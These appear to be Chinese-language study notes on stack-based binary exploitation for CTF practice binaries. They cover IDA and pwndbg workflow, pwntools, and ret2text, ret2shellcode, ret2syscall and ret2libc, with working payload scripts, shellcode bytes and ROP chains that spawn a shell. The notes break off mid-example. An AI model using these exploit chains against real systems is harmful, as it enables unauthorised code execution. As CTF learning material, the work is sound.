# Stack Exploit

[TOC]





## 前置

* 查看进程空间

  * 方法一

    > 正在运行的程序 `ps -a`查看pid
    >
    > `cat /proc/pid/maps`即可查看

  * 方法二

    > 安装pwndbg插件
    >
    > ```bash
    > gdb a.out
    > --- 进入动态调试 ---
    > b main --- 打下断点
    > r      --- 开始运行
    > vmmap  --- 查看进程空间
    > ```



* static linked program 执行过程

  ```
  ./binary 
      |
      +
  	fork()                                                    main()
      |                                                         +
      +                                                         |
  execve("./binary", *argv[], *envp[])                        _start              user mode
  ----|---------------------------------------------------------+-----------------------------
      +                                                         |                 kernel mode
  sys_execve()                                           load_elf_binary()
      |                                                         +
      +                                                         |
  do_execve() ---------------------------------------  search_binary_handler()
  
  ```

  

* dynamic linked program 执行过程

  ```
  ./binary 
      |
      +                             __libc_start_main() ----> _init
  	fork()                                   |                  |    
      |                                      +                  +
      |                                   _start              main()             
      +                                      |                 
  execve("./binary",*argv[],*envp[])       ld.so                                   user mode
  ----|--------------------------------------+-----------------------------------------------
      +                                      |                                   kernel mode
  sys_execve()                       load_elf_binary()
      |                                      +
      +                                      |
  do_execve() ------------------- search_binary_handler()
  
  ```



参数传递

* x86

  > stack

* amd64

  > rdi -> rsi -> rdx -> rcx -> r8 -> r9 ----> stack

* leave相当于

  ```assembly
  mov %ebp, %esp
  pop %ebp
  ```

* ret相当于

  ```assembly
  pop %eip
  ```

* 目前由于 the NX bits 保护措施的开启，栈缓冲区不可执行，故当下的常用手段变为向 bss 缓冲区写入 shellcode 或向堆缓冲区写入 shellcode 并使用 mprotect 赋予其可执行权限





## pwntools

```python
io.sendlineafter(b" :",str(elf.got["puts"]))
--- 当接收到第一个参数时,就会发送第二个参数+'\n' ---

io.recvuntil(b" : ")
--- 接收数据直到收到和参数相同的字符串
```



## IDA

* 一般只用`IDA View-A`足矣

* F5 ---> C代码

* g ---> 输入地址可以直接跳转到响应的位置（常用于验证`ret2syscall`中的`gadget`）

* 在C代码中双击函数 ---> 进入相应的函数定义界面 ---> Esc 返回

* 左侧栏

  > 白色部分：写死在ELF文件中的函数
  >
  > 粉色部分：动态链接的标识符（此处留在ELF文件中的只是一些表项）

* `_start`不可反编译

  > 在main函数之前，_start帮助做ELF文件执行时的初始化工作，在编译器中通过汇编完成

* 汇编代码和`C`或`Machine Code`的交互

  * 机器码和汇编语句同时显示

    > Options --> general -->( right ) Number of opcode bytes (graph)设置即可

  * 汇编语句与C语言同时显示

    > 体现传参与具体实现
    >
    > C语言界面 --> 全部选中 --> 右键 --> Copy to assembly

    <img src="D:\github\pwn\pwn_study\images\ida_assembly_and_C.png" alt="ida_assembly_and_C" style="zoom:33%;" />

* 在IDA View-A 中以text显示

  > 右键 text view 即可
  >
  > 或者直接 Tab （空格）键也可以

* `Ctrl + S`保存即可

  > 此时在分析的程序`programA`下方出现一个`programA.idb`可以直接用ida打开它

* 找不到入口函数的时候（`main`不是显式的）

  > 先运行一下程序 ---> 会出现相应的字符串
  >
  > shift+(Fn)+f12 ---> string window
  >
  > 双击找到初始运行程序时候出现的字符串即可定位到主函数周围
  >
  > 定位到`.rodata`节 --> 在其右下方有被引用的位置，双击即可定位到`entry`入口函数地址周围

  <img src="D:\github\pwn\pwn_study\images\ida_string_window.png" alt="ida_string_window" style="zoom:38%;" />

* 关闭时候不保存相关数据库就不会出现相关的数据库文件



## 本地连接构造pwn环境部署

* 先把相应的程序在本地运行，然后攻击（io接口初始为本地），本地测试成功后再将io切换为远程接口

* 交互模式

  ```python
  $ python3                     --- 在本地打开一个python3交互窗口
  >>> from pwn import *
  # 如果是本地测试
  >>> io = process("./ret2text")  --- 在本地开启题目程序为一个进程
  [x] Starting local process './ret2text'
  [+] Starting local process './ret2text': pid 137784
  # 如果是远程测试
  >>> io = remote("106.54.129.202", 10006)   --- remote(ip,port),此处只是举例
  # 查看对象属性
  >>> io
  <pwnlib.tubes.process.process object at 0x7f00557f7f40>
  ```

  io参数

  ```python
  -----------------必须是字节流
  io.send(p32(14) + b"hello \x0a")
                      ----整数变为字节raw数据用p32(int a),字符串前需要添加b,可以包括不可见字符'\x0a'即'\n'
  io.sendline()
  -----------------io.send(b"Hello\n") <=> io.sendline(b"Hello")
  io.recv()
  io.recvline()
  ------------------
  io.process() 本地连接
  io.remote() 远程连接
  ```

  过程

  ```python
  >>> io.recvline()
  b'Have you heard of buffer overflow?\n'
  >>> io.send(p32(0) + b"\x0abc")
  >>> io.recv()
  [*] Process './ret2text' stopped with exit code 0 (pid 137784)
  b'It seems that you know nothing about it ......\n'
  ```

  

* 脚本模式

  > 在本机测试时，可以通过获取执行后获取本机的shell来验证pwn是否成功
  >
  > zsh  ----- exploit script ------> bash





## 实例

gets

```C
#include <stdio.h>
char *gets(char *s);
```









## 分类

> `ROP ( Return Oriented Programming )`
>
> 所谓 gadgets 就是以 `ret` 结尾的！！！！指令序列！！！！！
>
> 
>
> 栈缓冲区溢出的基础上，利用程序中已有的**小片段**`gadgets`来改变某些`register`的值，或某些变量`variable`的值，从而控制程序执行流程



### ret2text

**篡改栈帧上的返回地址为程序中已有的后门函数**

> 返回到`.text`段上
>
> 有时候`programmers`可能会在编程过程中给自己留一个后门`backdoor in ELF`

```
+-----------+
	kernel
+-----------+
  ret_addr = backdoor_addr ------------+
+-----------+                          |
  stack                                |
  ...                                  |
+-----------+                          |
  shared libraries                     |
+-----------+                          |
  ...                                  |
  heap                                 |                          
+-----------+                          |
  bss                                  |
+-----------+                          |
  data                                 |
+-----------+                          |
  ...                                  |
+-----------+                          |
  backdoor in ELF  <-------------------+
+-----------+                          
	Unused
+-----------+
```

#### Q1

* 查看保护机制

  > 只开启了`NX`

  ```python
  $ checksec ret2text
  [*] '/home/ganliber/Documents/ROP/Q1/ret2text'
      Arch:     i386-32-little
      RELRO:    Partial RELRO
      Stack:    No canary found
      NX:       NX enabled
      PIE:      No PIE (0x8048000)
  ```

* `ida`反汇编

  > `setbuf`用来关闭缓冲区（命题人使用），便于下方**无延迟**输出

  ```C
  int __cdecl main(int argc, const char **argv, const char **envp)
  {
    setbuf(stdin, 0);
    setbuf(stdout, 0); 
    
    puts("Have you heard of buffer overflow?");
    vulnerable();
    puts("It seems that you know nothing about it ......");
    return 0;
  }
  ```

  进入`vulnerable`，IDA会标识   **能够写的缓冲区`buf`的边界和ebp的距离**   （但最好通过动态调试来实现对溢出点的判断，查看进程空间）

  ```C
  int vulnerable()
  {
    char buffer[8]; // [esp+8h] [ebp-10h] BYREF
  
    gets(buffer);
    return 0;
  }
  ```

  建议全屏terminal，同时(仅仅针对自己的电脑ubuntu20.04)

  ```
  ctrl+shift+'+' 放大字体
  ctrl+'-' 缩小字体
  ```

* 进入`pwndbg`调试

  ```python
  gdb ret2text
  ```

* 调试指令与笔记

  ```
  b: break
  n: next(单步调试)
  s: step in (进入到子函数内部)
  			-------- 注意下方[BACKTRACE]栏目显示的调用关系,从上往下调用关系是由内向外的,0号函数是当前函数栈帧
  stack 24 : 查看24行栈内容
  			-------- 查看栈帧时,注意查看[ebp ... esp]之间的部分,即为当前函数栈区间
  			-------- 如下图所示,紧挨着寄存器列（橙色）的是地址值, 右侧（红、粉色）是该地址的内容
  			-------- 我们的目标是溢出修改ebp紧挨着的下方的值即 0xffffcd8c 处的值（这里原本是 value of old eip）
  			-------- 该栈图示高地址在下，低地址在上
  			-------- 注意到写'AAAAAAAA'开始处是0008, ebp处是0018, 恰好相差了10h
  ```

  <img src="D:\github\pwn\pwn_study\images\gdb_stack_analyse.png" alt="gdb_stack_analyse" style="zoom:50%;" />

* 通过ida分析发现**后门函数**

  ```C
  int get_shell()
  {
    system("/bin/sh");
    return 0;
  }
  ```

* 查找后门函数地址

  ```
  ida View-A (text view) --> 左侧函数双击后门函数即可跳转到响应汇编的.text地址
  此处观察得到其地址为 0x08048522
  所以构造payload时应该用 p32(0x08048522) 打包成 raw data
  由于是4个字节因此对应32比特,用p32打包
  注意发送payload后需要调用
  io.interactive()
  进入交互模式，可以观察到此时已经在python交互模式下获得了一个shell，可以使用pwd,ls等命令，夺取了本机的控制权
  ```

  <img src="D:\github\pwn\pwn_study\images\locate_getshell_address.png" alt="locate_getshell_address" style="zoom: 33%;" />

* 效果

  ```python
  >>> from pwn import *
  >>> io=process('./ret2text')
  [x] Starting local process './ret2text'
  [+] Starting local process './ret2text': pid 138946
  >>> io.recvline()
  b'Have you heard of buffer overflow?\n'
  >>> payload = b'A' * 16 + b'BBBB' +p32(0x08048522)
  >>> io.sendline(payload)
  >>> io.interactive()
  [*] Switching to interactive mode
  ls
  ret2text
  pwd
  /home/ganliber/Documents/ROP/Q1
  ls -alh
  total 24K
  drwxrwxr-x 2 ganliber ganliber 4.0K 6月   2 02:10 .
  drwxrwxrwx 4 ganliber ganliber 4.0K 6月   1 23:44 ..
  -rw------- 1 ganliber ganliber  127 6月   2 02:10 .gdb_history
  -rwxrw-rw- 1 ganliber ganliber 9.7K 5月   8  2020 ret2text
  ls
  ret2text
  ```

* 脚本攻击

  > 可以先切换为`sh`，然后攻击后用`echo $SHELL`查看当前的shell

  ```python
  ganliber@ganliber-virtual-machine:~/Documents/ROP/Q1$ python3 exp.py
  [+] Starting local process './ret2text': pid 139154
  [*] Switching to interactive mode
  $ echo $SHELL
  /bin/zsh
  $  
  ```

  



### ret2shellcode

> shellcraft 默认是 32 位

```python
pwntools 中的 shellcraft 模块内置了若干shellcode
shellcraft.sh()  # 生成一个获取一个shell即sh的shellcode
print(shellcraft.sh())  # 打印汇编语言
>>>print(asm(shellcraft.sh()))  # 打印shellcode字节流
b'jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80'
```

* 如果要64位的shellcode

  > 需要先声明环境 context.arch="amd64"

  ```python
  >>> context
  ContextType(cache_dir = '/home/ganliber/.cache/.pwntools-cache-3.8')
  >>> context.arch="amd64"
  >>> print(asm(shellcraft.amd64.sh()))
  b'jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'
  ```

> * 篡改栈帧上的返回地址为攻击者手动传入的 shellcode 所在缓冲区地址
> * 初期往往将 shellcode 直接写入栈缓冲区
> * 目前由于 the NX bits 保护措施的开启，栈缓冲区不可执行，故当下的常用手段变为向 `bss` 缓冲区写入 shellcode 或向堆缓冲区写入 shellcode 并使用 mprotect 赋予其可执行权限
>   * `bss`可执行
>   * `ALSR`一般远程服务器都会打开，因此不能把`shellcode`放在`stack`上
>     * 当`PIE`没有打开的时候，ASLR不会影响bss的位置，因此此时可以把shellcode放到bss中
>   * `PIE`打开的时候，bss的位置是随机的，因此 PIE 未打开时，ASLR可以
> * `w`和`x`权限应该避免同时出现

#### Q2

* 查看C代码

  ```C
  int __cdecl main(int argc, const char **argv, const char **envp)
  {
    char s[100]; // [esp+1Ch] [ebp-64h] BYREF
  
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stdin, 0, 1, 0);
    puts("No system for you this time !!!");
  +--------------------------------------+
  | gets(s);                             |
  | strncpy(buf2, s, 0x64u);             |
  +--------------------------------------+--> 利用区间
    printf("bye bye ~");
    return 0;
  }
  ```

* 观察到`buf2`不是局部变量，因此是全局变量`.bss`中

* 双击`buf2`

  ```C
  .bss:0804A080 buf2            db 64h dup(?)           ; DATA XREF: main+7B↑o
  ```

* 由于ELF文件中是不会有stack的，因此开`ASLR`之后就不易找到stack的栈顶位置，但`.bss`本身就存在于ELF文件中，因此可以将`shellcode`放到`.bss`中

* 因此容易知道`.bss`的地址

  ```C
  0x0804A080
  ```

* 要根据实际情况查看溢出覆盖的范围

  <img src="D:\github\pwn\pwn_study\images\ret2shellcode_stack.png" alt="ret2shellcode_stack" style="zoom:38%;" />

* 由此见得从`1C `到`88`

  ```
  88h - 1Ch = 6ch = 108
  开头是shellcode(由print(asm(shellcraft.sh()))获得), 中间是五关字节流, 然后是4bytes的ebp覆盖流, 然后是.bss的地址(p32(0x0804A080))
  ```

* 利用脚本如下

  > 必须满足`.bss`是可读可写可执行的！！！！！！！

  ```python
  from pwn import *
  context(arch='i386', os='linux')
  
  bss_addr = 0x0804A080
  
  
  io=process('./ret2shellcode')
  io.recvline()  # puts()...
  shellcode = asm(shellcraft.sh())
  
  payload = shellcode.ljust(112,b'A') + p32(bss_addr) --- 112==108+4,4 bytes 垃圾数据来填充ebp
  print(payload)
  io.sendline(payload)
  io.interactive()
  ```

* 不成功的原因：在自己的机器上`.bss`段并不是可执行的！！！

  ![ret2shellcode_bss_no_executive](D:\github\pwn\pwn_study\images\ret2shellcode_bss_no_executive.png)

  实际上该ELF文件只有`stack`可执行，因此不能利用`.bss`



### ret2syscall

#### Q4

> ret2syscall

* 源码

  ```C
  int __cdecl main(int argc, const char **argv, const char **envp)
  {
    int v4; // [esp+1Ch] [ebp-64h] BYREF
  
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stdin, 0, 1, 0);
    puts("This time, no system() and NO SHELLCODE!!!");
    puts("What do you plan to do?");
    gets(&v4);
    return 0;
  }
  ```

* 动态调试查看v4相对于ebp的值

  > 根据图示：0x88-0x1c = 0x6c = 108

  <img src="D:\github\pwn\pwn_study\images\ret2syscall_v4.png" alt="ret2syscall_v4" style="zoom:33%;" />

* 将对应获取`shell`的系统调用的参数放到对应的寄存器中，在执行 

  ```assembly
  int 0x80
  ```

  时就可执行对应的系统调用，比如用如下系统调用获取`shell`

  ```C
  execve("bin/sh", NULL, NULL)
  ```

  * 该程序需要为32位程序，且需要

    * 系统调用号，eax = 0xb
    * param-1: ebx = addr( /bin/sh )
    * param-2: ecx = 0
    * param-3: edx = 0

    实际上对应汇编语句为

    ```assembly
    	mov eax, 0xb
    	mov ebx, ["/bin/sh"] 
    	mov ecx, 0
    	mov edx, 0
    	int 0x80
    	=> execve("/bin/sh",NULL,NULL)
    ```

  * 控制`register`

    <img src="C:\Users\XiZhongKuiYue\AppData\Roaming\Typora\typora-user-images\image-20220602195724435.png" alt="image-20220602195724435" style="zoom:33%;" />

  * 查找`gadget`

    > 查找可存储寄存器的代码
    >
    > ```python
    > ROPgadget --binary rop  --only 'pop|ret' | grep 'eax'
    > ---对于此题目则将rop换做ret2syscall---
    > ROPgadget --binary ret2syscall --only 'pop|ret' |grep 'eax'
    > ```
    >
    > 查找字符串
    >
    > ```python
    > ROPgadget --binary rop --string "/bin/sh"
    > ```
    >
    >
    > 查找有int 0x80的地址
    >
    > ```python
    > ROPgadget --binary rop  --only 'int'
    > ```
    >
    > rop指的是二进制文件名，详细的指令可通过输入指令`ROPgadget -h`查看。

    最终得到`gadget`

    > 第二行可以一次性控制住 edx, ecx, ebx

    ```python
    [1] 0x080bb196 : pop eax ; ret
    [2] 0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret
    ```

    得到`'/bin/sh'`

    ```python
    $ ROPgadget --binary ret2syscall  --string  '/bin/sh'
    Strings information
    ============================================================
    0x080be408 : /bin/sh
    ```

    得到`int 80h`的地址

    ```python
    $ ROPgadget --binary ret2syscall  --only 'int'                 
    Gadgets information
    ============================================================
    0x08049421 : int 0x80
    
    Unique gadgets found: 1
    ```

* 因此可以构造`payload`

  ```python
  payload = 112*b'A' + p32(0x080bb196)                     --- 垃圾数据 + ret[1]
  payload += p32(0xb) + p32(0x0806eb90)                    --- eax值 + ret[2]
  payload += p32(0)+p32(0)+p32(0x080be408)+p32(0x08049412)   --- edx,ecx,ebx值 + ret[int 80h]
  综合
  payload = 112*b'A' + p32(0x080bb196) +p32(0xb) + p32(0x0806eb90)+p32(0)+p32(0)+p32(0x080be408)+p32(0x08049421)
  ```

* 脚本

  ```python
  from pwn import *
  io = process('./ret2syscall')
  # io.recvline()
  # io.recvline()
  payload = 112*b'A' + p32(0x080bb196) +p32(0xb) + p32(0x0806eb90)+p32(0)+p32(0)+p32(0x080be408)+p32(0x08049421)
  io.sendline(payload)
  io.interactive()
  ```

* 或者为了更规整方便的构造`payload`

  > 此时攻击的二进制文件是`rop`

  ```python
  #!/usr/bin/env python
  from pwn import *
  
  sh = process('./rop')
  
  pop_eax_ret = 0x080bb196
  pop_edx_ecx_ebx_ret = 0x0806eb90
  int_0x80 = 0x08049421
  binsh = 0x80be408
  payload = flat(
      ['A' * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])
  sh.sendline(payload)
  sh.interactive()
  ```



### ret2libc

**有时候`gadget`可能凑不齐**

该例题是静态链接的，所以可以凑齐响应的`payload`，其余的题目都是静态链接的，不容易凑够`payload`！！！

libc是被完整的加载到内存的，而**不是**只加载需要的函数部分！！！

> 控制函数执行`libc`中的函数，通常是返回至某个函数的 `plt` 处或者函数的具体位置 (即函数对应的 `got` 表项的内容)。一般情况下，我们会选择执行 `system("/bin/sh")`，故而此时我们需要知道 `system` 函数的地址。

### 前置知识

* readelf

  ```
  -h --file-header      Display the ELF file header
  -l --program-headers  Display the program headers
  -S --section-headers  Display the section headers
  -s --syms             Display the symbol table 
  --dyn-syms            Display the dynamic symbol table
  ```

  应用：在libc查看`system`函数的偏移量

  ```python
  $ readelf -s /lib/x86_64-linux-gnu/libc-2.31.so | grep "system@"
     619: 0000000000052290    45 FUNC    GLOBAL DEFAULT   15 __libc_system@@GLIBC_PRIVATE
    1430: 0000000000052290    45 FUNC    WEAK   DEFAULT   15 system@@GLIBC_2.2.5
  ```

* `.got`和`.got.plt`

  ```
  *** sections ***       *** .got.plt ***
      .dynamic   <----   addr of .dynamic
      .got               link_map
      .got.plt    ---->  __dl_runtime_resolve
      .data              printf@plt+6
                         puts
  
  .got 
  --- (Global Offset Table)          -> 全部变量符号偏移
  --- 全局偏移表,是Linux ELF文件中用于定位全局变量和函数的一个表
  --- .got节是运行时只读的，可以用于存放全局变量的地址，也可以用于存放不需要延迟绑定的函数的地址。
  
  .plt
  --- .plt节中存放的是需要重定位的外部调用的符号，.plt[0]存放的是更新GOT表中动态链接符号加载地址的操作——
      将.got.plt[1]中存放的link_map结构体压入栈作为下一步的函数参数，跳转到.got.plt[2]执行动态链接器符号解析函数
      _dl_runtime_resolve。在延迟绑定场景，.plt[0]的执行会在外部函数第一次调用的时候进行，在该场景中符号的GOT表
      内容会被初始化为.plt[0]的地址，在执行过plt[0]的操作后会被更新为符号的加载地址
  
  .got.plt (True Address)
  --- (Procedure Linkage Table)      -> 全部函数真实地址的表
  --- 过程链接表, 属于.got
  --- .got.plt是运行时可读写的，在延迟绑定过程中与 .plt 一起使用，如果关闭了延迟绑定则没有该节。
  --- .got.plt[1]存放了link_map结构体的地址，.gotplt[2]存放了dl_runtime_resolve函数的地址，后面的各项则用于存
      放函数的加载地址，在使用延迟绑定的时候这些项里会统一初始化为.plt[0]的地址，用于执行_dl_runtime_resolve函
      数，在执行完成后会被重新初始化为函数的加载地址，在下一次调用的时候就会直接调用了，因此.got.plt必须是运行时可
      读写的
  
  .dynamic section
  --- 提供动态链接相关信息
  
  link_map
  --- 保存进程载入的动态链接库的链表(链接库不一定只有libc, 还会有ld装载器以及其他的一些动态链接库)
  
  __dl_runtime_resolve
  --- 装载器中用于解析动态链接库中函数的 ** 实际地址 ** 的函数
      被.plt所调用
  ```

  <img src="C:\Users\XiZhongKuiYue\AppData\Roaming\Typora\typora-user-images\image-20220603015107595.png" alt="image-20220603015107595" style="zoom:33%;" />

* 延迟绑定

  > 所谓延迟绑定，就是当函数第一次被调用的时候才进行绑定（包括符号查找、重定位等），如果函数从来没有用到过就不进行绑定。基于延迟绑定可以大大加快程序的启动速度，特别有利于一些引用了大量函数的程序

  例子

  ```
  假如存在一个bar函数，这个函数在PLT中的条目为bar@plt，在GOT中的条目为bar@got，那么在第一次调用bar函数的时候，首先会跳转到PLT，伪代码如下：
  
  bar@plt:
  	jmp bar@got
  	patch bar@got
  
  这里会从PLT跳转到GOT，如果函数从来没有调用过，那么这时候GOT会跳转回PLT并调用patch bar@got，这一行代码的作用是将bar函数真正的地址填充到bar@got，然后跳转到bar函数真正的地址执行代码。当我们下次再调用bar函数的时候，执行路径就是先后跳转到bar@plt、bar@got、bar真正的地址
  ```

* 动态链接过程`x86`

  <img src="C:\Users\XiZhongKuiYue\AppData\Roaming\Typora\typora-user-images\image-20220603021656572.png" alt="image-20220603021656572" style="zoom: 50%;" />

* 如果想调试带上源C代码，gcc编译时候需要加上参数`-g`

* 32位程序编译环境配置

  ```
  如果想编出32位的程序，就要加 -m32选项。可是我尝试了，还是不行。
  安装环境所需。
  $ sudo apt-get install build-essential module-assistant  
  $ sudo apt-get install gcc-multilib g++-multilib  
  装好之后，就OK了。
  比如
  gcc -m32 hello.c
  ```



#### Dynamic Llinking Test

生成32位动态链接ELF文件，同时关闭`PIE`保护机制

```makefile
$ gcc -m32 -g -no-pie dyn.c -o dyn.out
$ checksec dyn.out
[*] '/home/ganliber/Documents/pwn_test/dyn_demo/dyn.out'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
------ 注意该程序动态调试时发现plt中
No symbols found in section .plt
------ 查看got表
pwndbg> got

GOT protection: Partial RELRO | GOT functions: 6
 
[0x804c00c] gets@GLIBC_2.0 -> 0x8049040 ◂— endbr32 
[0x804c010] strcpy@GLIBC_2.0 -> 0x8049050 ◂— endbr32 
[0x804c014] puts@GLIBC_2.0 -> 0x8049060 ◂— endbr32 
[0x804c018] exit@GLIBC_2.0 -> 0x8049070 ◂— endbr32 
[0x804c01c] __libc_start_main@GLIBC_2.0 -> 0xf7de1de0 (__libc_start_main) ◂— endbr32 
[0x804c020] __isoc99_scanf@GLIBC_2.7 -> 0x8049090 ◂— endbr32 
------ 发现都是真实地址而不是plt中的延迟加载的代码地址
```

查看一个`ret2libc1`文件（可以在动态调试过程中查看plt和got的内容）

```C
gdb ret2libc1
b main
r
plt
got
```

在`IDA`中也可以看到

> data段相对text处于高地址区域（二者紧挨着）

对应`.plt`表项（在代码段`.text`区域）中紧接着的代码就是

```assembly
push 0
jmp plt[0]
```



<img src="D:\github\pwn\pwn_study\images\dynamic_linking_plt.png" alt="dynamic_linking_plt" style="zoom:50%;" />

查看`.got.plt`表项（在数据段`.data`区域），每个表项4字节（32位程序），记录真实地址

<img src="D:\github\pwn\pwn_study\images\dynamic_linking_got.png" alt="dynamic_linking_got" style="zoom:50%;" />

动态调试查看

> 此时`got`还没有更新，所以其中存的地址是`gets@plt+6`，意味着需要回到`plt`表中执行延迟加载的代码，即先 push，后jmp plt[0]去执行`_dl_runtime_resolve`函数

```C
GOT protection: Partial RELRO | GOT functions: 10
 
[0x804a00c] gets@GLIBC_2.0 -> 0x8048436 (gets@plt+6) ◂— 0x68 /* 'h' */
[0x804a010] time@GLIBC_2.0 -> 0x8048446 (time@plt+6) ◂— 0x868
[0x804a014] puts@GLIBC_2.0 -> 0x8048456 (puts@plt+6) ◂— 0x1068
[0x804a018] system@GLIBC_2.0 -> 0x8048466 (system@plt+6) ◂— 0x1868
[0x804a01c] __gmon_start__ -> 0x8048476 (__gmon_start__@plt+6) ◂— 0x2068 /* 'h ' */
[0x804a020] srand@GLIBC_2.0 -> 0x8048486 (srand@plt+6) ◂— 0x2868 /* 'h(' */
[0x804a024] __libc_start_main@GLIBC_2.0 -> 0xf7de1de0 (__libc_start_main) ◂— endbr32 
[0x804a028] setvbuf@GLIBC_2.0 -> 0x80484a6 (setvbuf@plt+6) ◂— 0x3868 /* 'h8' */
[0x804a02c] rand@GLIBC_2.0 -> 0x80484b6 (rand@plt+6) ◂— 0x4068 /* 'h@' */
[0x804a030] __isoc99_scanf@GLIBC_2.7 -> 0x80484c6 (__isoc99_scanf@plt+6) ◂— 0x4868 /* 'hH' */
```

执行几步，第一次执行完`puts`时，查看`got`即可发现`puts`表项的地址不再指向`plt`了，而是储存的`puts`在`libc`中的真实地址

```C
[0x804a00c] gets@GLIBC_2.0 -> 0x8048436 (gets@plt+6) ◂— 0x68 /* 'h' */
[0x804a010] time@GLIBC_2.0 -> 0x8048446 (time@plt+6) ◂— 0x868
[0x804a014] puts@GLIBC_2.0 -> 0xf7e34c40 (puts) ◂— endbr32         ****** 0xf7e34c40即function puts的真实地址
```

查看`[0x804a014]`处的内存内容

```C
pwndbg> x /20x 0x804a014
0x804a014 <puts@got.plt>:	0xf7e34c40	0x08048466	0x08048476	0x08048486
0x804a024 <__libc_start_main@got.plt>:	0xf7de1de0	0xf7e35430	0x080484b6	0x080484c6
0x804a034:	0x00000000	0x00000000	0x08048720	0xf7fb2580
0x804a044:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a054:	0x00000000	0x00000000	0x00000000	0xf7fb2d20
```

反汇编查看`puts`的真实内容（节选）

```assembly
pwndbg> disassemble 0xf7e34c40
Dump of assembler code for function __GI__IO_puts:
Address range 0xf7e34c40 to 0xf7e34e53:
   0xf7e34c40 <+0>:	endbr32 
   0xf7e34c44 <+4>:	push   ebp
   0xf7e34c45 <+5>:	mov    ebp,esp
   0xf7e34c47 <+7>:	push   edi
   0xf7e34c48 <+8>:	call   0xf7f0ab45 <__x86.get_pc_thunk.di>
   0xf7e34c4d <+13>:	add    edi,0x17d3b3
   0xf7e34c53 <+19>:	push   esi
   0xf7e34c54 <+20>:	push   ebx
   0xf7e34c55 <+21>:	sub    esp,0x28
   0xf7e34c58 <+24>:	push   DWORD PTR [ebp+0x8]
   0xf7e34c5b <+27>:	mov    DWORD PTR [ebp-0x24],edi
   0xf7e34c5e <+30>:	call   0xf7e68600 <__strlen_ia32>
   0xf7e34c63 <+35>:	add    esp,0x10
   0xf7e34c66 <+38>:	mov    DWORD PTR [ebp-0x1c],eax
   0xf7e34c69 <+41>:	mov    eax,DWORD PTR [edi-0x74]
   0xf7e34c6f <+47>:	mov    esi,DWORD PTR [eax]
   0xf7e34c71 <+49>:	mov    DWORD PTR [ebp-0x20],eax
   0xf7e34c74 <+52>:	mov    eax,DWORD PTR [esi]
   0xf7e34c76 <+54>:	and    eax,0x8000
   0xf7e34c7b <+59>:	jne    0xf7e34d60 <__GI__IO_puts+288>
   ...
```

所得即`puts`函数的反汇编代码

#### ret2libc原理

> 篡改栈帧上自**返回地址**开始的一段区域为一系列 `gadget` 的地址，最终调用 `libc` 中的函数获取 shell

#### Q1

> ret2libc1 : 32-bit ELF, dynamically linked

查看安全机制

```C
$ checksec ret2libc1
[*] '/home/ganliber/Documents/pwn_test/stack/Q_ret2libc/ret2libc1'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

反汇编

```C
int __cdecl main(int argc, const char **argv, const char **envp) {
  char s[100]; // [esp+1Ch] [ebp-64h] BYREF
  setvbuf(stdout, 0, 2, 0);
  setvbuf(_bss_start, 0, 1, 0);
  puts("RET2LIBC >_<");
  gets(s);
  return 0;
}
```

由于动态链接`syscall`不一定能全部集齐对`eax,ebx,ecx,edx`的控制，但查看`plt`时发现`system@plt`表项

```C
pwndbg> plt
0x8048430: gets@plt
0x8048440: time@plt
0x8048450: puts@plt
0x8048460: system@plt <-------------- system@plt 表项
0x8048470: __gmon_start__@plt
0x8048480: srand@plt
0x8048490: __libc_start_main@plt
0x80484a0: setvbuf@plt
0x80484b0: rand@plt
0x80484c0: __isoc99_scanf@plt
```

因此`ret2libc`的关键是跳转到`plt`表的`system`表项，查看plt表中`_system`表项的地址，即`0x08048460`

![_system_addr](D:\github\pwn\pwn_study\images\_system_addr.png)

除了跳转到`system@plt`的地址，还需要布置栈帧设置参数

> system("/bin/sh")实际上是system函数接收的是在`.rodata`中的`address`

```
stack 
high_addr
--------------------
"/bin/sh" addr        <--- 只能是"/bin/sh" addr,因为作为string, "/bin/sh"存放于.rodata section,并不在栈上
--------------------
exit()                <--- 或者垃圾数据'b'*4,由于原ret_addr跳转后相当于会有call system,这时候栈结构应该是需要有一 
                           个返回地址的(作为函数system的函数返回地址),即  (high)|param|old eip|(low)
--------------------
system@plt            <--- 原 return address
--------------------
low_addr
```

实际上参数应该为`0x08048720`

> 查找字符串：ctrl + shift + F12，双击跳转

![string_sh_rodata](D:\github\pwn\pwn_study\images\string_sh_rodata.png)

或者查找

```shell
pwndbg> shell ROPgadget --binary ret2libc1 --string '/bin/sh'
Strings information
============================================================
0x08048720 : /bin/sh
```

同样

```
ebp - (gets &str) = 108
加上垃圾数据(ebp)  -> 112
```

那么有

> 构造payload的时候中间要插入**一个**垃圾数据'b'*4
>
> 原理
>
> ```
> 子函数(callee)和父函数(caller)的栈帧之间搁着一个 ret_addr !!!
> callee 保存了父函数的 ebp(栈底)
> caller 保存了子函数的 params(参数) and return_address(返回地址)
> ```

**exploit**

```python
#!/usr/bin/env python
from pwn import *

system_plt_addr = 0x08048460
string_sh_addr = 0x08048720
payload = flat(['a'*112, system_plt_addr, 'b'*4, string_sh_addr])

io = process('./ret2libc1')
io.sendline(payload)
io.interactive()
```



#### Q2

> 该题目与 `Q1` 基本一致，只不过不再出现 /bin/sh 字符串，所以此次需要我们自己来读取字符串，所以我们需要两个 gadgets，第一个控制程序读取字符串，第二个控制程序执行 system("/bin/sh")。

查看`system@plt`和`gets@plt`

```C
0x8048460: gets@plt
0x8048470: time@plt
0x8048480: puts@plt
0x8048490: system@plt
```

查找`"/bin/sh"`，发现并没有

```C
pwndbg> shell ROPgadget --binary ret2libc2 --string '/bin/sh'
Strings information
============================================================
```

反汇编`main`函数，发现`.bss`数据段数据（`char s[100]`）（没有开启`PIE`）

> 考虑把`'/bin/sh'`存放到`.bbs`段

```C
int __cdecl main(int argc, const char **argv, const char **envp)
{
